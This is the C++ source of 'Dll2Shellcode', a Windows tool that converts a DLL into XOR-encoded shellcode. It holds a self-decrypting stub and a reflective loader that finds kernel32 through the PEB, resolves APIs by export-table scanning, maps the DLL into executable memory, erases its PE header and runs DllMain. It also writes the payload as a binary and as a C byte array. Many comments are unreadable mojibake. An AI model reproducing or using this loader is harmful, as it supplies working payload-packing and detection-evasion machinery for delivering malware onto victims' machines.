// dll2shellcode.cpp : Defines the entry point for the console application.

#include <Windows.h>
#include <iostream>
#include <string>
using namespace std;

DWORD dwFlag =0xffeeddcc;

#define  GetAlignedSize(nOrigin, nAlignment)  ((nOrigin) + (nAlignment) - 1) / (nAlignment) * (nAlignment)

typedef BOOL	(APIENTRY *ProcDllMain)		( HINSTANCE, DWORD, LPVOID);
typedef FARPROC (WINAPI *MyGetProcAddress)	( HMODULE hModule, LPCSTR lpProcName);
typedef LPVOID  (WINAPI *MyVirtualAlloc)	( LPVOID lpAddress,SIZE_T dwSize,DWORD flAllocationType,DWORD flProtect);
typedef BOOL    (WINAPI *MyVirtualProtect)	( LPVOID lpAddress,SIZE_T dwSize,DWORD flNewProtect,PDWORD lpflOldProtect);
typedef HMODULE (WINAPI *MyGetModuleHandleA)( LPCSTR lpModuleName );
typedef HMODULE (WINAPI *MyLoadLibraryA)	( LPCSTR lpLibFileName );
typedef BOOL    (WINAPI *MyVirtualFree)		( LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType );


__declspec(naked) void XorShell()
{
	_asm
	{
		call lab1;
lab1:
		pop ebx;
		add ebx,0x1b;
		nop;
		nop;
		nop;
		xor ecx,ecx;
		mov al,0x25;//xor key
lab2:
		XOR BYTE PTR DS:[ECX+EBX],AL;
		INC ecx;
		CMP ECX,0x12345678;//shell header + dll file = size
		jl lab2;
		nop;
		nop;
		nop;
	}
}

//void __declspec(naked) END_XorShell(void) {}

void WINAPI ShellHeader()
{
	//��λdll�ļ���ʼ��ַ
	LPBYTE lpFileData;
	_asm
	{
		call SELF
SELF:
		pop lpFileData
	}

	for (int i = 0 ; i < 0xffff; i++)
	{
		if (lpFileData[i] == 0xcc && lpFileData[i+1] == 0xdd && lpFileData[i + 2] == 0xee && lpFileData[i+3 ] == 0xff)
		{
			lpFileData += i;
			lpFileData += 4;
			break;
		}
	}

	HMODULE hMod;
	MyGetProcAddress	myGetProcAddress;
	MyLoadLibraryA		myLoadLibrayA;

	MyVirtualAlloc		myVirtualAlloc;
	MyVirtualFree		myVirtualFree;
	MyVirtualProtect	myVirtualProtect;
	MyGetModuleHandleA	myGetModuleHandleA;

	//�õ�Kernel32�����GetProcAddress��ַ
	__asm{

		pushad    //����Ĵ���

		mov eax, dword ptr fs:[0x30];  
		mov eax, dword ptr [eax+0xC];  
		mov eax, dword ptr [eax+0xC];  
		mov eax, dword ptr [eax];  
		mov eax, dword ptr [eax];  
		mov eax, dword ptr [eax+0x18];  

		mov hMod,eax
		mov myGetProcAddress,eax

		push ebp

		mov ebp,eax                         // Kernel.dll��ַ  
		mov eax,dword ptr ss:[ebp+3CH]      // eax=PE�ײ�  
		mov edx,dword ptr ds:[eax+ebp+78H]  //  
		add edx,ebp                         // edx=��������ַ  
		mov ecx,dword ptr ds:[edx+18H]      // ecx=��������������NumberOfFunctions  
		mov ebx,dword ptr ds:[edx+20H]      //  
		add ebx,ebp                         // ebx=��������ַ��AddressOfName  
start:                                      //  
		dec ecx                             // ѭ���Ŀ�ʼ  
		mov esi,dword ptr ds:[ebx+ecx*4]    //  
		add esi,ebp                         //  
		mov eax,0x50746547                  //  
		cmp dword ptr ds:[esi],eax          // �Ƚ�PteG  
		jnz start                           //  
		mov eax,0x41636F72                  //  
		cmp dword ptr ds:[esi+4],eax        // �Ƚ�Acor��ͨ��GetProcA�����ַ�����ȷ����GetProcAddress  
		jnz start                           //  
		mov ebx,dword ptr ds:[edx+24H]      //  
		add ebx,ebp                         //  
		mov cx,word ptr ds:[ebx+ecx*2]      //  
		mov ebx,dword ptr ds:[edx+1CH]      //  
		add ebx,ebp                         //  
		mov eax,dword ptr ds:[ebx+ecx*4]    //  
		add eax,ebp                         // eax ������GetProcAddress��ַ  
		mov ebx,eax                         // GetProcAddress��ַ����ebx�����дShellCode�Ļ��Ժ󻹿���

		pop ebp

		push ebx
		pop myGetProcAddress

		popad
	}
	char szLoadLibrary[] = {'L','o','a','d','L','i','b','r','a','r','y','A','\0'};
	myLoadLibrayA = (MyLoadLibraryA)myGetProcAddress(hMod,szLoadLibrary);
	char szVirtualAlloc[] = {'V','i','r','t','u','a','l','A','l','l','o','c','\0'};
	myVirtualAlloc = (MyVirtualAlloc)myGetProcAddress(hMod,szVirtualAlloc);
	char szVirtualFree[] = {'V','i','r','t','u','a','l','F','r','e','e','\0'};
	myVirtualFree = (MyVirtualFree)myGetProcAddress(hMod,szVirtualFree);
	char szVirtualProtect[] = {'V','i','r','t','u','a','l','P','r','o','t','e','c','t','\0'};
	myVirtualProtect = (MyVirtualProtect)myGetProcAddress(hMod,szVirtualProtect);
	char szGetModuleHandleA[] = {'G','e','t','M','o','d','u','l','e','H','a','n','d','l','e','A','\0'};
	myGetModuleHandleA = (MyGetModuleHandleA)myGetProcAddress(hMod,szGetModuleHandleA);
	
	//MemLoadDll

	PIMAGE_DOS_HEADER		pDosHeader;
	PIMAGE_NT_HEADERS		pNTHeader;
	PIMAGE_SECTION_HEADER	pSectionHeader;


	pDosHeader = (PIMAGE_DOS_HEADER)lpFileData;  // DOSͷ
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
	{
		return;  //0x5A4D : MZ
	}
	//ȡ��peͷ
	pNTHeader = (PIMAGE_NT_HEADERS)((PBYTE)lpFileData + pDosHeader->e_lfanew); // PEͷ
	if (pNTHeader->Signature != IMAGE_NT_SIGNATURE)
	{
		return;  //0x00004550 : PE00
	}
	if ((pNTHeader->FileHeader.Characteristics & IMAGE_FILE_DLL) == 0) //0x2000  : File is a DLL
	{
		return;  
	}
	if ((pNTHeader->FileHeader.Characteristics & IMAGE_FILE_EXECUTABLE_IMAGE) == 0) //0x0002 : ָ���ļ���������
	{
		return;
	}
	if (pNTHeader->FileHeader.SizeOfOptionalHeader != sizeof(IMAGE_OPTIONAL_HEADER))
	{
		return;
	}
	//ȡ�ýڱ����α���
	pSectionHeader = (PIMAGE_SECTION_HEADER)((PBYTE)pNTHeader + sizeof(IMAGE_NT_HEADERS));
	
	// ��������ļ��ؿռ�  
	int nImageSize = 0;

	if (pNTHeader == NULL)
	{
		return;
	}
	int nAlign = pNTHeader->OptionalHeader.SectionAlignment; //�ζ����ֽ���
	// ��������ͷ�ĳߴ硣����dos, coff, peͷ �� �α��Ĵ�С
	nImageSize = GetAlignedSize(pNTHeader->OptionalHeader.SizeOfHeaders, nAlign);
	// �������нڵĴ�С
	for (int i=0; i < pNTHeader->FileHeader.NumberOfSections; ++i)
	{
		//�õ��ýڵĴ�С
		int nCodeSize = pSectionHeader[i].Misc.VirtualSize ;
		int nLoadSize = pSectionHeader[i].SizeOfRawData;
		int nMaxSize = (nLoadSize > nCodeSize) ? (nLoadSize) : (nCodeSize);
		int nSectionSize = GetAlignedSize(pSectionHeader[i].VirtualAddress + nMaxSize, nAlign);

		if (nImageSize < nSectionSize)
		{
			nImageSize = nSectionSize;  //Use the Max;
		}
	}

	if (nImageSize == 0)
	{
		return;
	}
	// ���������ڴ�
	void *pMemoryAddress = myVirtualAlloc(NULL, nImageSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (pMemoryAddress == NULL)
	{
		return;
	}
	else
	{
		LPVOID pDest = pMemoryAddress;
		LPVOID pSrc = lpFileData;

		// ������Ҫ���Ƶ�PEͷ+�α��ֽ���
		int  nHeaderSize = pNTHeader->OptionalHeader.SizeOfHeaders;
		int  nSectionSize = pNTHeader->FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER);
		int  nMoveSize = nHeaderSize + nSectionSize;
		

		for (int i = 0; i < nMoveSize ; i++)
		{
			((char*)pDest)[i] = ((char*)pSrc)[i];
		}

		//����ÿ����
		for (int i=0; i < pNTHeader->FileHeader.NumberOfSections; ++i)
		{
			if (pSectionHeader[i].VirtualAddress == 0 || pSectionHeader[i].SizeOfRawData == 0)
			{
				continue;
			}
			// ��λ�ý����ڴ��е�λ��
			void *pSectionAddress = (void *)((PBYTE)pDest + pSectionHeader[i].VirtualAddress);

			for (int j = 0; j < pSectionHeader[i].SizeOfRawData ; j++)
			{
				((char*)pSectionAddress)[j] = ((char*)((PBYTE)pSrc + pSectionHeader[i].PointerToRawData))[j];
			}
		}
		//����ָ�룬ָ���·�����ڴ�
		//�µ�dosͷ
		pDosHeader = (PIMAGE_DOS_HEADER)pDest;
		//�µ�peͷ��ַ
		pNTHeader = (PIMAGE_NT_HEADERS)((PBYTE)pDest + (pDosHeader->e_lfanew));
		//�µĽڱ���ַ
		pSectionHeader = (PIMAGE_SECTION_HEADER)((PBYTE)pNTHeader + sizeof(IMAGE_NT_HEADERS));

		//�ض�λ��Ϣ
		if (pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress > 0
			&& pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size > 0)
		{
			/************************************************************************/
			/*                          �޸��ض�λ��Ϣ                              */
			/************************************************************************/

			void *pNewBase  = pMemoryAddress;

			/* �ض�λ���Ľṹ��
			// DWORD sectionAddress, DWORD size (����������Ҫ�ض�λ������)
			// ���� 1000����Ҫ����5���ض�λ���ݵĻ����ض�λ����������
			// 00 10 00 00   14 00 00 00      xxxx xxxx xxxx xxxx xxxx 0000
			// -----------   -----------      ----
			// �����ڵ�ƫ��  �ܳߴ�=8+6*2     ��Ҫ�����ĵ�ַ           ���ڶ���4�ֽ�
			// �ض�λ�������ɸ����������address �� size����0 ��ʾ����
			// ��Ҫ�����ĵ�ַ��12λ�ģ���4λ����̬�֣�intel cpu����3
			*/
			//����NewBase��0x600000,���ļ������õ�ȱʡImageBase��0x400000,������ƫ��������0x200000
	
			//ע���ض�λ����λ�ÿ��ܺ�Ӳ���ļ��е�ƫ�Ƶ�ַ��ͬ��Ӧ��ʹ�ü��غ�ĵ�ַ
			PIMAGE_BASE_RELOCATION pLoc = (PIMAGE_BASE_RELOCATION)((unsigned long)pNewBase 
				+ pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

			while ((pLoc->VirtualAddress + pLoc->SizeOfBlock) != 0) //��ʼɨ���ض�λ��
			{
				WORD *pLocData = (WORD *)((PBYTE)pLoc + sizeof(IMAGE_BASE_RELOCATION));
				//���㱾����Ҫ�������ض�λ���ַ������Ŀ
				int nNumberOfReloc = (pLoc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION))/sizeof(WORD);

				for ( int i=0 ; i < nNumberOfReloc; i++)
				{
					// ÿ��WORD����������ɡ���4λָ�����ض�λ�����ͣ�WINNT.H�е�һϵ��IMAGE_REL_BASED_xxx�������ض�λ���͵�ȡֵ��
					// ��12λ�������VirtualAddress���ƫ�ƣ�ָ���˱�������ض�λ��λ�á�
					if ((DWORD)(pLocData[i] & 0x0000F000) == 0x0000A000)
					{
						// 64λdll�ض�λ��IMAGE_REL_BASED_DIR64
						// ����IA-64�Ŀ�ִ���ļ����ض�λ�ƺ�����IMAGE_REL_BASED_DIR64���͵ġ�
		#ifdef _WIN64
						ULONGLONG* pAddress = (ULONGLONG *)((PBYTE)pNewBase + pLoc->VirtualAddress + (pLocData[i] & 0x0FFF));
						ULONGLONG ullDelta = (ULONGLONG)pNewBase - pNTHeader->OptionalHeader.ImageBase;
						*pAddress += ullDelta;
		#endif
					}
					else if ((DWORD)(pLocData[i] & 0x0000F000) == 0x00003000) //����һ����Ҫ�����ĵ�ַ
					{
						// 32λdll�ض�λ��IMAGE_REL_BASED_HIGHLOW
						// ����x86�Ŀ�ִ���ļ������еĻ�ַ�ض�λ����IMAGE_REL_BASED_HIGHLOW���͵ġ�
		#ifndef _WIN64
						DWORD* pAddress = (DWORD *)((PBYTE)pNewBase + pLoc->VirtualAddress + (pLocData[i] & 0x0FFF));
						DWORD dwDelta = (DWORD)pNewBase - pNTHeader->OptionalHeader.ImageBase;
						*pAddress += dwDelta;
		#endif
					}
				}
				//ת�Ƶ���һ���ڽ��д���
				pLoc = (PIMAGE_BASE_RELOCATION)((PBYTE)pLoc + pLoc->SizeOfBlock);
			}

			/************************************************************************/
			/*                          OVER                                        */
			/************************************************************************/
		}
		/************************************************************************/
		/*                             ��������ַ��                           */
		/************************************************************************/

		void* pImageBase = pMemoryAddress;
		BOOL ret = FALSE;


		// �����ʵ������һ�� IMAGE_IMPORT_DESCRIPTOR �ṹ���飬ȫ����0��ʾ����
		// ���鶨�����£�
		// 
		// DWORD   OriginalFirstThunk;         // 0��ʾ����������ָ��δ�󶨵�IAT�ṹ����
		// DWORD   TimeDateStamp; 
		// DWORD   ForwarderChain;             // -1 if no forwarders
		// DWORD   Name;                       // ����dll������
		// DWORD   FirstThunk;                 // ָ��IAT�ṹ����ĵ�ַ(�󶨺���ЩIAT�������ʵ�ʵĺ�����ַ)
		unsigned long nOffset = pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress ;

		if (nOffset == 0)
		{
			ret = TRUE; //No Import Table
		}

		PIMAGE_IMPORT_DESCRIPTOR pID = (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)pImageBase + nOffset);

		while (pID->Characteristics != 0)
		{
			PIMAGE_THUNK_DATA pRealIAT = (PIMAGE_THUNK_DATA)((PBYTE)pImageBase + pID->FirstThunk);
			PIMAGE_THUNK_DATA pOriginalIAT = (PIMAGE_THUNK_DATA)((PBYTE)pImageBase + pID->OriginalFirstThunk);
			//��ȡdll������
#define NAME_BUF_SIZE 256

			char szBuf[NAME_BUF_SIZE]; //dll name;
			BYTE* pName = (BYTE*)((PBYTE)pImageBase + pID->Name);
			int i=0;

			for (i=0; i<NAME_BUF_SIZE; i++)
			{
				if (pName[i] == 0)
				{
					break;
				}
				szBuf[i] = pName[i];
			}
			if (i >= NAME_BUF_SIZE)
			{
				ret = FALSE;  // bad dll name
			}
			else
			{
				szBuf[i] = 0;
			}

			HMODULE hDll = myGetModuleHandleA(szBuf);

			if (hDll == NULL)
			{
				hDll = myLoadLibrayA(szBuf);
				if (hDll == NULL) ret = FALSE;
				//return FALSE; //NOT FOUND DLL
			}
			//��ȡDLL��ÿ�����������ĵ�ַ������IAT
			//ÿ��IAT�ṹ�� ��
			// union { PBYTE  ForwarderString;
			//   PDWORD Function;
			//   DWORD Ordinal;
			//   PIMAGE_IMPORT_BY_NAME  AddressOfData;
			// } u1;
			// ������һ��DWORD ����������һ����ַ��
			for (i=0; ; i++)
			{
				if (pOriginalIAT[i].u1.Function == 0)
				{
					break;
				}

				FARPROC lpFunction = NULL;

				if (pOriginalIAT[i].u1.Ordinal & IMAGE_ORDINAL_FLAG) //�����ֵ�������ǵ������
				{
					lpFunction = myGetProcAddress(hDll, (LPCSTR)(pOriginalIAT[i].u1.Ordinal & 0x0000FFFF));
				}
				else //�������ֵ���
				{
					//��ȡ��IAT���������ĺ�������
					PIMAGE_IMPORT_BY_NAME pByName = (PIMAGE_IMPORT_BY_NAME)((PBYTE)pImageBase + (pOriginalIAT[i].u1.AddressOfData));

					lpFunction = myGetProcAddress(hDll, (char *)pByName->Name);
				}
				if (lpFunction != NULL)   //�ҵ��ˣ�
				{
#ifdef _WIN64
					pRealIAT[i].u1.Function = (ULONGLONG)lpFunction;
#else
					pRealIAT[i].u1.Function = (DWORD)lpFunction;
#endif
				}
				else
				{
					ret = FALSE;
				}
			}

			//move to next 
			pID = (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)pID + sizeof(IMAGE_IMPORT_DESCRIPTOR));
		}

		ret = TRUE;

		/************************************************************************/
		/*                             OVER                                     */
		/************************************************************************/

		if (!ret) //���������ַ��ʧ��
		{
			myVirtualFree(pMemoryAddress, 0, MEM_RELEASE);
			return;
		}
		//�޸�ҳ���ԡ�Ӧ�ø���ÿ��ҳ�����Ե����������Ӧ�ڴ�ҳ�����ԡ������һ�¡�
		//ͳһ���ó�һ������PAGE_EXECUTE_READWRITE
		unsigned long unOld;

		myVirtualProtect(pMemoryAddress, nImageSize, PAGE_EXECUTE_READWRITE, &unOld);
	}
	//��������ַ
#ifdef WIN32
	pNTHeader->OptionalHeader.ImageBase = (DWORD)pMemoryAddress;
#else
	pNTHeader->OptionalHeader.ImageBase = (ULONGULONG)pMemoryAddress;
#endif
	//������Ҫ����һ��dll����ں���������ʼ��������
	ProcDllMain pDllMain = (ProcDllMain)(pNTHeader->OptionalHeader.AddressOfEntryPoint + (PBYTE)pMemoryAddress);

	//���peͷ �㶮��
	for (int i = 0; i < 0x1000 ; i++)
	{
		((BYTE*)pMemoryAddress)[i] = 0x00;
	}
	


	//����һ������Ĵ�С �Լ������ͷŵ�
	BOOL InitResult = pDllMain((HINSTANCE)pMemoryAddress, DLL_PROCESS_ATTACH, (LPVOID)nImageSize);

	if (!InitResult) //��ʼ��ʧ��
	{
		pDllMain((HINSTANCE)pMemoryAddress, DLL_PROCESS_DETACH, 0);
		myVirtualFree(pMemoryAddress, 0, MEM_RELEASE);
		pDllMain = NULL;
		return;
	}
	return;
}


void WriteHeader(char *szPath,BYTE *bCode,DWORD dwCode_size)
{
	int	cols = 16;
	FILE *	fp = NULL;
	fp = fopen((szPath), ("w+b"));

	char * banner = "Generated by Dll2Shellcode v1.0 ----by:w1nds";

	fprintf(fp,
		"// %s\r\n\r\n"
		"// Length: 0x%08X (bytes)\r\n"
		"unsigned char ShellCode[%d] =\r\n"
		"{\r\n",
		banner, dwCode_size, dwCode_size);

	for ( DWORD i = 0; i < dwCode_size; i++)
	{
		if (0 == i % cols && i)
		{
			fprintf(fp, "\r\n");
		}

		fprintf(fp, "0x%02X%s", bCode[i] , i == (dwCode_size - 1) ? " " : ", ");
	}
	fprintf(fp, "\r\n};\r\n");
	fclose(fp);
}


int main(int argc, char* argv[])
{
	cout<<"dllpath:";
	string strDllpath;
	getline(cin,strDllpath);
	cout<<endl;
	HANDLE hFile = CreateFile(strDllpath.c_str(),GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		cout<<"failed!"<<endl;
		return 0;
	}
	DWORD dwFileSize = GetFileSize(hFile,0);
	BYTE *bFileBuf = new BYTE[dwFileSize];
	DWORD dwReaded = 0;
	ReadFile(hFile,bFileBuf,dwFileSize,&dwReaded,0);
	CloseHandle(hFile);

	//make
	
	DWORD dwXorShellSize = (DWORD)ShellHeader-(DWORD)XorShell;
	DWORD dwShellHeaderSize = (DWORD)WriteHeader-(DWORD)ShellHeader;
	DWORD dwShellCodeLen = dwXorShellSize+dwShellHeaderSize+dwFileSize+4;//4�ֽڱ�־


	BYTE *bOut = new BYTE[dwShellCodeLen];
	ZeroMemory(bOut,dwShellCodeLen);
	memcpy(bOut,XorShell,dwXorShellSize);

	//patch xor shell
	printf("patch");
	DWORD dwPatchSize = dwShellHeaderSize+dwFileSize+4;
	for (int i = 0 ; i < dwXorShellSize; i++)
	{
		if (bOut[i] == 0x78 && bOut[i+1] == 0x56 && bOut[i + 2] == 0x34 && bOut[i+3 ] == 0x12)
		{
			memcpy(&bOut[i],&dwPatchSize,4);
			break;
		}
	}

	
	memcpy(bOut+dwXorShellSize,ShellHeader,dwShellHeaderSize);
	memcpy(bOut+dwXorShellSize+dwShellHeaderSize,&dwFlag,4);
	memcpy(bOut+dwXorShellSize+dwShellHeaderSize+4,bFileBuf,dwFileSize);

	printf("test1");
	for (int i=0;i<(dwPatchSize);i++)
	{
		*(bOut+dwXorShellSize+i) = 0x25^bOut[dwXorShellSize+i];//xor key
	}

	//generate binary file and header file

	hFile = CreateFileA("shell.dat",GENERIC_WRITE,FILE_SHARE_WRITE,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	if (hFile==INVALID_HANDLE_VALUE)
	{
		cout<<"make binary file failed!"<<endl;
	}
	WriteFile(hFile,bOut,dwShellCodeLen,&dwReaded,NULL);
	CloseHandle(hFile);

	WriteHeader("ShellCode.h",bOut,dwShellCodeLen);
	
	cout<<"ok!"<<endl;
	

	//call test
	/*
	LPVOID pAddr = VirtualAlloc(NULL,dwShellCodeLen,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
	memcpy(pAddr,bOut,dwShellCodeLen);

	_asm
	{
		mov eax,pAddr;
		call eax;
	}
	VirtualFree(pAddr,0,MEM_RELEASE); //MEM_DECOMMIT

	*/
	delete []bFileBuf;
	delete []bOut;

	system("pause");
	return 0;
}
